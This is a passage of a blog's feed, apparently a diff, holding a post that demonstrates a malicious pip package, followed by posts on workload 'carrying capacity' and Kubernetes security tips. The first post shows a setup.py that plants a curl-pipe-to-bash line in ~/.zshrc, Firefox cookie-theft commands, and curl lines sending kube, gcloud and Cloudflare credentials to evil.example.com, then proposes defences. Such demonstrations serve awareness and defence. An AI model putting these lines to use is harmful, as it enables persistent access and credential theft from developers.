+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;{os.environ[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HOME&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;.zshrc&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
+&lt;&#x2F;span&gt;&lt;span&gt;        f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;curl http:&#x2F;&#x2F;evil.example.com &amp;gt; &#x2F;dev&#x2F;null 2&amp;gt;&amp;amp;1 | bash || true&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span&gt;    install.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ guarddog scan .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;Found 0 potentially malicious indicators scanning .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Great! Now we have the ability to execute arbitrary code frequently, with a high likelihood that our code will execute while the victim is logged in.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-3-pivoting-to-prod&quot;&gt;Step 3: Pivoting to prod&lt;&#x2F;h2&gt;
+&lt;p&gt;The world is now our oyster. Without some kind of sandboxing in place, we can access the vast majority of important files on the file system, including SSH keys, &lt;code&gt;~&#x2F;.kube&#x2F;config&lt;&#x2F;code&gt;, cloud credentials, and browser cookies. It just depends on what we decide to put into that &lt;code&gt;f.write()&lt;&#x2F;code&gt; call.&lt;&#x2F;p&gt;
+&lt;p&gt;Here&#x27;s an example of stealing a cookie:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ cd ~&#x2F;Library&#x2F;Application\ Support&#x2F;Firefox&#x2F;Profiles&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;# There may be multiple profiles, just pick the first one
+&lt;&#x2F;span&gt;&lt;span&gt;$ cd $(ls | head -n 1)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# Database will probably be locked if the browser is open, so just copy it
+&lt;&#x2F;span&gt;&lt;span&gt;$ cp cookies.sqlite unlocked-cookies.sqlite
+&lt;&#x2F;span&gt;&lt;span&gt;$ sqlite3 cookies.sqlite
+&lt;&#x2F;span&gt;&lt;span&gt;sqlite&amp;gt; SELECT name,value FROM moz_cookies WHERE host=&amp;quot;news.ycombinator.com&amp;quot;;
+&lt;&#x2F;span&gt;&lt;span&gt;user|mac-chaffee&amp;amp;PCeezf4hhaH5S7BRsTtX&#x2F;hVUQ3SQb9IpFU
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# Now to peek at an auth-protected page using that cookie:
+&lt;&#x2F;span&gt;&lt;span&gt;curl -i -SsLH &amp;#39;Cookie: user=mac-chaffee&amp;amp;PCeezf4hhaH5S7BRsTtX&#x2F;hVUQ3SQb9IpFU&amp;#39; &amp;#39;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;upvoted?id=mac-chaffee&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I was surprised to see FireFox does nothing to protect cookies on disk, even if you sign into FireFox Sync. At least Chrome encrypts them using macOS Keychain, but &lt;a href=&quot;https:&#x2F;&#x2F;mango.pdf.zone&#x2F;stealing-chrome-cookies-without-a-password&quot;&gt;you can bypass that too&lt;&#x2F;a&gt;. Surely Safari is properly using macOS security features to protect cookies, right? Wrong. You can apparently &lt;a href=&quot;https:&#x2F;&#x2F;lapcatsoftware.com&#x2F;articles&#x2F;disclosure2.html&quot;&gt;modify Safari with malicious code without invalidating its code signature&lt;&#x2F;a&gt;. It&#x27;s telling that &lt;a href=&quot;https:&#x2F;&#x2F;attack.mitre.org&#x2F;techniques&#x2F;T1539&#x2F;&quot;&gt;MITRE&#x27;s page on cookie theft&lt;&#x2F;a&gt; has no real solution to this problem either.&lt;&#x2F;p&gt;
+&lt;p&gt;Here&#x27;s an example of stealing my cloudflare credentials:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;curl --data-binary=@~&#x2F;Library&#x2F;Preferences&#x2F;.wrangler&#x2F;config&#x2F;default.toml http:&#x2F;&#x2F;evil.example.com
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Or my Kubernetes credentials:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;curl --data-binary=@~&#x2F;.kube&#x2F;config http:&#x2F;&#x2F;evil.example.com
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Or my gcloud credentials:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;curl --data-binary=@~&#x2F;.config&#x2F;gcloud&#x2F;credentials.db http:&#x2F;&#x2F;evil.example.com
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Not even 2FA will save me here. Even if some of those sites are VPN-protected or they tie the credentials to a specific source IP, that&#x27;s not an issue for an attacker. They can just execute the API calls directly from my computer through the VPN.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;aside-my-outbound-firewall-littlesnitch-et-al-will-catch-you&quot;&gt;Aside: My outbound firewall (LittleSnitch et. al.) will catch you!&lt;&#x2F;h3&gt;
+&lt;p&gt;That&#x27;s only true if I exfiltrate the credentials or if I try to download a &amp;quot;stage 2&amp;quot; payload instead of directly including my exploit code in setup.py. I bet you already have a rule allowing your terminal application to access your cloud accounts anyway.&lt;&#x2F;p&gt;
+&lt;p&gt;I considered editing the LittleSnitch config files manually, but to their credit, the config files are owned by root (thus requiring a password to read&#x2F;edit). Even the new CLI won&#x27;t let you do anything unless you are root.&lt;&#x2F;p&gt;
+&lt;p&gt;Another way attackers can circumvent something like LittleSnitch is to proxy the traffic through a host you have already allowed, like maybe I use your company&#x27;s internal HTTP proxy, or maybe I upload your credentials to an S3 bucket (you allow s3.amazonaws.com, right?). I can perform recon on your computer to determine what kinds of precautions I can&#x2F;should take.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;potential-solutions&quot;&gt;Potential Solutions&lt;&#x2F;h2&gt;
+&lt;p&gt;I think a true solution to this kind of hack would be: proper sandboxing for desktop operating systems with a user experience that isn&#x27;t built by masochists (looking at you SELinux).&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;support.apple.com&#x2F;en-my&#x2F;guide&#x2F;mac-help&#x2F;mchl244f2895&#x2F;10.14&#x2F;mac&#x2F;10.14&quot;&gt;MacOS Mojave added a feature&lt;&#x2F;a&gt; which blocks access to certain folders, but frustratingly limited the feature to folders like Documents, Pictures, etc., not &lt;code&gt;~&#x2F;.kube&#x2F;config&lt;&#x2F;code&gt; for instance. Wouldn&#x27;t stop this attack, but it&#x27;s a step in the right direction.&lt;&#x2F;p&gt;
+&lt;p&gt;MacOS has also started requiring Mac App Store apps to use the &amp;quot;&lt;a href=&quot;https:&#x2F;&#x2F;developer.apple.com&#x2F;documentation&#x2F;security&#x2F;app_sandbox&quot;&gt;app sandbox&lt;&#x2F;a&gt;&amp;quot;, which is kinda the same thing but also includes camera, microphone, etc. Again, wouldn&#x27;t stop the attack I described above because your terminal app will be the one executing both your code and the malicious code. And no one makes a good sandboxed terminal app anyway.&lt;&#x2F;p&gt;
+&lt;p&gt;MacOS does have a CLI utility which allows you to execute commands inside of an &amp;quot;app sandbox&amp;quot;. Apple has deprecated the CLI and definitely doesn&#x27;t want you to use it, but with a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;lynaghk&#x2F;sandboxtron&quot;&gt;wrapper script called &amp;quot;sb&amp;quot;&lt;&#x2F;a&gt; and some custom policies, it can be manageable:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ sb -- pip install .
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;  × python setup.py bdist_wheel did not run successfully.
+&lt;&#x2F;span&gt;&lt;span&gt;  │ exit code: 1
+&lt;&#x2F;span&gt;&lt;span&gt;  ╰─&amp;gt; [7 lines of output]
+&lt;&#x2F;span&gt;&lt;span&gt;      running bdist_wheel
+&lt;&#x2F;span&gt;&lt;span&gt;      running build
+&lt;&#x2F;span&gt;&lt;span&gt;        warnings.warn(
+&lt;&#x2F;span&gt;&lt;span&gt;      installing to build&#x2F;bdist.macosx-12.3-x86_64&#x2F;wheel
+&lt;&#x2F;span&gt;&lt;span&gt;      running install
+&lt;&#x2F;span&gt;&lt;span&gt;      error: [Errno 1] Operation not permitted: &amp;#39;&#x2F;Users&#x2F;machaffe&#x2F;.zshrc&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;      [end of output]
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;nixos.wiki&#x2F;wiki&#x2F;Nix_package_manager#Sandboxing&quot;&gt;Nix has a feature&lt;&#x2F;a&gt; where package builds are executed inside a restricted sandbox. If you installed my pip package via Nix, sounds like you&#x27;d be totally safe. Well, assuming you enabled that feature, which is not enabled by default on macOS.&lt;&#x2F;p&gt;
+&lt;p&gt;There are &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;stepchowfun&#x2F;toast&quot;&gt;tools&lt;&#x2F;a&gt; that make it easier to develop entirely in containers, but it can be very challenging to get your editor&#x2F;IDE to play nice with these. There will also be places where you&#x27;ll have to relax the security boundary, like allowing access to SSH keys to run an ansible playbook. Or using a SaaS API key to process some data in a Jupyter notebook.&lt;&#x2F;p&gt;
+&lt;p&gt;I met a Googler who said everyone they know uses some internal version of &lt;a href=&quot;https:&#x2F;&#x2F;cloud.google.com&#x2F;blog&#x2F;products&#x2F;application-development&#x2F;introducing-cloud-shell-editor&quot;&gt;Google Cloud Shell Editor&lt;&#x2F;a&gt;, a cloud based IDE. I don&#x27;t think this solves the problem since you are essentially working in a VM where you &lt;code&gt;pip install&lt;&#x2F;code&gt; stuff into the same VM that has access to deploy stuff to Google Cloud:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;mac@cloudshell:~$ gcloud projects list
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;prompt pops up to authorize gcloud, which is granted for the entire session&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;mac@cloudshell:~$ pip install -v .
+&lt;&#x2F;span&gt;&lt;span&gt;Using pip 20.3.4 from &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pip (python 3.9)
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;  running install
+&lt;&#x2F;span&gt;&lt;span&gt;  ************************ pwned ************************
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I think all these tools are approaching the problem from the wrong direction. Why lock-down every app on my computer or change my whole workflow just to protect a few security-sensitive files? One feature I&#x27;d like is for applications like &lt;code&gt;gcloud&lt;&#x2F;code&gt; or &lt;code&gt;kubectl&lt;&#x2F;code&gt; to easily tell the operating system &amp;quot;I&#x27;m going to create a file called &lt;code&gt;credentials.txt&lt;&#x2F;code&gt;, and only I should have access to it&amp;quot;. The macOS Keychain is supposed to be that, but it&#x27;s not difficult to &lt;a href=&quot;https:&#x2F;&#x2F;wojciechregula.blog&#x2F;post&#x2F;stealing-macos-apps-keychain-entries&#x2F;&quot;&gt;bypass the Keychain ACLs&lt;&#x2F;a&gt;, even for signed binaries.&lt;&#x2F;p&gt;
+&lt;p&gt;Another approach would be heavily restricting access to production. You can&#x27;t avoid accessing prod entirely due to emergencies, but you can get close. You&#x27;d need some kind of auditing jump box like &lt;a href=&quot;https:&#x2F;&#x2F;www.cyberark.com&#x2F;products&#x2F;privileged-access-manager&#x2F;&quot;&gt;CyberArk&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;goteleport.com&#x2F;&quot;&gt;Teleport&lt;&#x2F;a&gt; with hardware 2FA and super short sessions. You&#x27;d only use this for emergencies, so you should probably enable that &amp;quot;email&#x2F;IM my entire team if someone accesses prod&amp;quot; feature too. But to be truly safe from local malware, you&#x27;d still want ways to stop session hijacking, key logging, and screen grabbing. Not sure if the tech is there to do this perfectly, so you&#x27;re still stuck with trying to fend off local malware with crappy tools.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;&#x2F;h2&gt;
+&lt;p&gt;Local malware &lt;em&gt;sucks&lt;&#x2F;em&gt;. It&#x27;s too easy to get infected and too easy for attackers to avoid detection, even though local malware has basically been around about as long as computers have existed. I&#x27;m disappointed in the software security industry for spending decades chasing flashy, profitable products instead of actually improving security. You know what? I&#x27;m starting to suspect this whole idea of a society dedicated to profit-seeking above all else is not such a good idea...&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Know your carrying capacity</title>
+		<published>2022-10-08T00:00:00+00:00</published>
+		<updated>2022-10-08T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2022/carrying-capacity/" type="text/html"/>
+		<id>/blog/2022/carrying-capacity/</id>
+		<content type="html">&lt;p&gt;Take a second to think through all the &amp;quot;stuff&amp;quot; you have to personally maintain at your job. Here are a few ideas:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Physical servers or virtual machines&lt;&#x2F;li&gt;
+&lt;li&gt;Internal libraries&lt;&#x2F;li&gt;
+&lt;li&gt;A handful of microservices&lt;&#x2F;li&gt;
+&lt;li&gt;Some test cases you wrote&lt;&#x2F;li&gt;
+&lt;li&gt;CI&#x2F;CD stuff&lt;&#x2F;li&gt;
+&lt;li&gt;Helper scripts&lt;&#x2F;li&gt;
+&lt;li&gt;Open-source repos&lt;&#x2F;li&gt;
+&lt;li&gt;Security&#x2F;legal compliance&lt;&#x2F;li&gt;
+&lt;li&gt;Software licenses&lt;&#x2F;li&gt;
+&lt;li&gt;All of the tools on your computer (IDE+extensions, shell+extensions, CLI tools, SSH&#x2F;GPG keys, etc.)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Some less obvious ones:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Membership in ActiveDirectory groups or equivalent&lt;&#x2F;li&gt;
+&lt;li&gt;Membership in an email alias or chat group&lt;&#x2F;li&gt;
+&lt;li&gt;A chatbot (including the one-click installable ones)&lt;&#x2F;li&gt;
+&lt;li&gt;All those little no-code, IFTT-type things&lt;&#x2F;li&gt;
+&lt;li&gt;Some internal wiki pages&lt;&#x2F;li&gt;
+&lt;li&gt;Meeting series&#x27; or working groups&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Depending on company size, pretty much any one of these bullet points could be someone&#x27;s full-time job, but it&#x27;s not uncommon to see one person having to do a little of all of these (I sure do).&lt;&#x2F;p&gt;
+&lt;p&gt;I like to think of the collection of things that someone can reasonably maintain as their &amp;quot;&lt;em&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Carrying_capacity&quot;&gt;carrying capacity&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&amp;quot;, to borrow the ecology term. If you take on more than your carrying capacity, something has to die (aka fall into disrepair). With modern software being so garbage, I think one big reason is that there are too many software professionals out there who don&#x27;t know their carrying capacity.&lt;&#x2F;p&gt;
+&lt;p&gt;Not knowing your carrying capacity can lead to:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Security issues. All software rots under the deluge of new CVEs these days.&lt;&#x2F;li&gt;
+&lt;li&gt;Productivity issues. That helper script you abandoned had a bug that your co-worker had to fix without any context.&lt;&#x2F;li&gt;
+&lt;li&gt;Usability issues. That microservice you never optimized is making your users mad (but just subtly enough so they don&#x27;t think to file a bug report, and they experience slow websites all the time so it doesn&#x27;t affect your bottom line, just slowly eats away at their psyche instead)&lt;&#x2F;li&gt;
+&lt;li&gt;Trust issues. That working group you established (and later neglected) dis-incentivizes future engagement. See also &lt;a href=&quot;https:&#x2F;&#x2F;killedbygoogle.com&#x2F;&quot;&gt;the Google product graveyard&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;More fallout from turnover. When an over-capacity employee quits, they explode like a piñata filled with responsibilities that everyone else has to scoop up. Over-capacity employees also likely don&#x27;t even know the full extent of the responsibilities they do have, meaning some of them just don&#x27;t get picked up.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;So hopefully this post can help avoid those things!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;odds-are-that-you-are-part-of-the-problem&quot;&gt;Odds are that YOU are part of the problem&lt;&#x2F;h2&gt;
+&lt;p&gt;I&#x27;m not talking about people who have been pushed beyond their carrying capacity by other people. You don&#x27;t need a ton of self-awareness to know when that&#x27;s what&#x27;s happening. But when &lt;em&gt;you&lt;&#x2F;em&gt; push &lt;em&gt;yourself&lt;&#x2F;em&gt; beyond your carrying capacity, you likely won&#x27;t even notice. And since it&#x27;s tough to notice (and since so much tech is under-maintained garbage), it&#x27;s likely you are part of the problem!&lt;&#x2F;p&gt;
+&lt;p&gt;Why is it hard to notice when you are beyond your carrying capacity? Well because you can&#x27;t notice things deteriorating that you don&#x27;t even actively&#x2F;regularly think of. If you&#x27;ve worked somewhere for long enough, there&#x27;s bound to be something you&#x27;ve forgotten about. So many of the building blocks of modern software simply can&#x27;t alert you when they need maintenance. Documentation won&#x27;t email you when it becomes obsolete. You won&#x27;t get immediately sued for every lapse in compliance.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;&#x2F;h2&gt;
+&lt;p&gt;All we can really do is to consciously think about our own carrying capacities whenever we take on a new task. Frequently re-visit that &amp;quot;list of things you have to personally maintain&amp;quot; in order to avoid blind spots. When you do this, you might be forced to jog your own memory by re-reading those docs or investigating that old VM. This has the (desireable) side-effect of taking up a lot of your time! If you are already responsible for so many things that you spend so much time re-checking them, you definitely can&#x27;t take on new things!&lt;&#x2F;p&gt;
+&lt;p&gt;All I ask is for just a little bit more conscientiousness when it comes to maintenance.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Under-documented Kubernetes Security Tips</title>
+		<published>2022-09-18T00:00:00+00:00</published>
+		<updated>2022-09-18T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2022/k8s-under-documented-security-tips/" type="text/html"/>
+		<id>/blog/2022/k8s-under-documented-security-tips/</id>
+		<content type="html">&lt;p&gt;Securing Kubernetes is complex, so there are quite a few guides out there:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;workbench.cisecurity.org&#x2F;benchmarks&#x2F;6083&quot;&gt;CIS Benchmarks for Kubernetes&lt;&#x2F;a&gt; (free account login required)&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.nsa.gov&#x2F;Press-Room&#x2F;News-Highlights&#x2F;Article&#x2F;Article&#x2F;2716980&#x2F;nsa-cisa-release-kubernetes-hardening-guidance&#x2F;&quot;&gt;NSA&#x2F;CISA Kubernetes Hardening Guidance&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;security&#x2F;pod-security-standards&#x2F;&quot;&gt;Kubernetes Pod Security Standards&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;cheatsheetseries.owasp.org&#x2F;cheatsheets&#x2F;Kubernetes_Security_Cheat_Sheet.html&quot;&gt;Various&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;tasks&#x2F;administer-cluster&#x2F;securing-a-cluster&#x2F;&quot;&gt;other&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;www.aquasec.com&#x2F;cloud-native-academy&#x2F;kubernetes-in-production&#x2F;kubernetes-security-best-practices-10-steps-to-securing-k8s&#x2F;&quot;&gt;sources&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Unfortunately, following all those guides and patching every CVE still might not be enough. There are some security practices which kinda don&#x27;t fit into these guides, don&#x27;t get reported as CVEs, and just exist in the minds of expensive consultants.&lt;&#x2F;p&gt;
+&lt;p&gt;The fast proliferation of Kubernetes has meant that many more organizations are running Kubernetes without the personnel or the money to secure it properly. And yes, that includes you, &amp;quot;person who is primarily a developer, but deployed an GKE cluster 6 months ago while following the CIS benchmarks and hasn&#x27;t looked at it since, thinking it&#x27;s super secure because it&#x27;s &#x27;managed&#x27; by Google&amp;quot;. Hopefully this collection of tips will help you out!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;1-a-secure-cluster-needs-a-secure-organization&quot;&gt;1 - A secure cluster needs a secure organization&lt;&#x2F;h2&gt;
+&lt;p&gt;This tip might be the hardest to hear for often-introverted software folks. You can&#x27;t achieve excellent security though technology alone; you also need to deal with &lt;em&gt;people&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;I went through ISO-27001&#x2F;27002 compliance at a previous company, and that standard is mainly devoted to organizational changes. Since the ISO standards are super-expensive PDFs, here are just a few fair-use points:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Establish and enforce policies:&lt;&#x2F;strong&gt; There are &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;open-policy-agent&#x2F;gatekeeper-library&quot;&gt;open-source libraries&lt;&#x2F;a&gt; of Kubernetes-related policies, but your organization might need custom policies like &amp;quot;Public-facing Ingresses require a security review&amp;quot; or &amp;quot;Access to (some sensitive namespace) requires approval&amp;quot;. And what do you do if someone violates the policy? Termination? Now you have to talk to HR. This stuff might even need to be someone&#x27;s (or a team&#x27;s) full-time job.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Implement segregation of duties:&lt;&#x2F;strong&gt; If there&#x27;s valuable data in your cluster, you don&#x27;t want to have a person with unfettered, un-audited access to a shared cluster-admin token (which is common).&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Everyone needs security training:&lt;&#x2F;strong&gt; Multiple days need to be set aside to &lt;em&gt;actually&lt;&#x2F;em&gt; learn about security. Not just your team, but also the dev team, PMs, and managers. No, reading this blog post does not count, but good question!&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Periodically review everything:&lt;&#x2F;strong&gt; If you don&#x27;t &lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2020&#x2F;08&#x2F;26&#x2F;former_cisco_engineer_aws_webex_teams&#x2F;&quot;&gt;this can happen&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Have an incident management plan:&lt;&#x2F;strong&gt; Preferably one that doesn&#x27;t take &lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2022&#x2F;05&#x2F;04&#x2F;heroku_security_communication_dubbed_complete&#x2F;&quot;&gt;three weeks&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;All of these points indicate that running Kubernetes clusters securely is absolutely not something you can &amp;quot;set and forget&amp;quot;. You have to be constantly monitoring, patching, educating, documenting, and improving your security posture just to stay afloat.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-the-kubernetes-api-has-undocumented-verbs-and-subresources&quot;&gt;2 - The Kubernetes API has undocumented verbs and subresources&lt;&#x2F;h2&gt;
+&lt;p&gt;Access to the Kubernetes API is very sensitive, but hard to do right. Roles and ClusterRoles are used to list which &amp;quot;resources&amp;quot; and &amp;quot;verbs&amp;quot; that someone&#x2F;something can perform. Like &lt;code&gt;The serviceaccount named &#x27;runner&#x27; can &#x27;create&#x27; (verb) &#x27;pods&#x27; (resource)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;But &lt;em&gt;there is no complete list of verbs or subresources anywhere&lt;&#x2F;em&gt;. As a result, using a wildcard (&lt;code&gt;*&lt;&#x2F;code&gt;) in a Role is essentially undefined behavior: you could be granting users the ability to use these undocumented verbs&#x2F;subresources.&lt;&#x2F;p&gt;
+&lt;p&gt;One example is the &lt;code&gt;escalate&lt;&#x2F;code&gt; verb on Roles. Accidentally granting this to a user allows them to create new Roles for themselves with more privileges than their existing Role. You might as well have just given them full admin access!&lt;&#x2F;p&gt;
+&lt;p&gt;Another example is the &lt;code&gt;pods&#x2F;ephemeralcontainers&lt;&#x2F;code&gt; subresource and how it interacts with &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;reference&#x2F;access-authn-authz&#x2F;extensible-admission-controllers&#x2F;&quot;&gt;ValidatingWebhooks&lt;&#x2F;a&gt;. The &lt;code&gt;pods&#x2F;ephemeralcontainers&lt;&#x2F;code&gt; subresource allows users to create &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;workloads&#x2F;pods&#x2F;ephemeral-containers&#x2F;&quot;&gt;Ephemeral Containers&lt;&#x2F;a&gt; inside existing pods, but this new subresource could allow you to bypass ValidatingWebhooks that are designed to stop you from running privileged pods. At one point in time, Gatekeeper, Kyverno, and OpenShift SCCs were all vulnerable to this issue. OpenShift SCCs still are, so make sure no one has access to &lt;code&gt;pods&#x2F;ephemeralcontainers&lt;&#x2F;code&gt; (the default).&lt;&#x2F;p&gt;
+&lt;p&gt;To sum up: pay very close attention to your Roles&#x2F;ClusterRoles, avoid using wildcards, and watch out for new subresources&#x2F;verbs in the patch notes. Kubernetes RBAC is a good-but-flawed system that is easy to mess up, and the tooling in this area is still quite immature.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-remember-that-kubernetes-is-essentially-remote-code-execution-as-a-service&quot;&gt;3 - Remember that Kubernetes is essentially remote-code-execution-as-a-service&lt;&#x2F;h2&gt;
+&lt;p&gt;Let&#x27;s say I create an API where anything you POSTed in the request body would be &lt;code&gt;eval&lt;&#x2F;code&gt;&#x27;d server-side. That&#x27;s how you should be thinking of Kubernetes, as &amp;quot;remote code execution as a service&amp;quot; (RCEaaS). Once you accept that, many important conclusions can be drawn:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;I need to take authentication extremely seriously.&lt;&#x2F;strong&gt; Using ServiceAccount tokens is not enough to secure RCEaaS. I need to tie into a proper identity provider, maybe using &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;reference&#x2F;access-authn-authz&#x2F;authentication&#x2F;#openid-connect-tokens&quot;&gt;OIDC&lt;&#x2F;a&gt;, maybe with 2FA.&lt;&#x2F;li&gt;
